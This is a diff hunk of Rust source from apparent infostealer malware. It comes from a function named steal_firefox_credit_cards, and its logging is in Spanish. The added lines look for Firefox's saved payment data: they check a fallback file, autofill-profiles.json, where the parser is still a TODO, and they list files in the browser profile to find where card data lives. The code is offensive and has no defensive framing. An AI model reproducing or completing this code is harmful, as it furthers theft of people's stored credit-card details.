@@ -988,7 +988,27 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
                 log(&format!("    🔍 Buscando DB: {}", formautofill_db.display()));
                 
                 if !formautofill_db.exists() {
-                    log("    ⚠️  DB NO EXISTE");
+                    log("    ⚠️  formautofill.sqlite NO EXISTE");
+                    
+                    // ALTERNATIVA 1: autofill-profiles.json (Firefox antiguo)
+                    let json_path = profile_path.join("autofill-profiles.json");
+                    log(&format!("    🔍 Buscando alternativa: {}", json_path.display()));
+                    if json_path.exists() {
+                        log("    ✅ autofill-profiles.json ENCONTRADO!");
+                        // TODO: Implementar parser JSON
+                    } else {
+                        log("    ⚠️  autofill-profiles.json tampoco existe");
+                    }
+                    
+                    // ALTERNATIVA 2: Listar TODOS los archivos del perfil
+                    log("    📂 Archivos en el perfil:");
+                    if let Ok(entries) = std::fs::read_dir(&profile_path) {
+                        for (idx, entry) in entries.flatten().take(20).enumerate() {
+                            let filename = entry.file_name();
+                            log(&format!("      {}. {:?}", idx + 1, filename));
+                        }
+                    }
+                    
                     continue;
                 }
                 
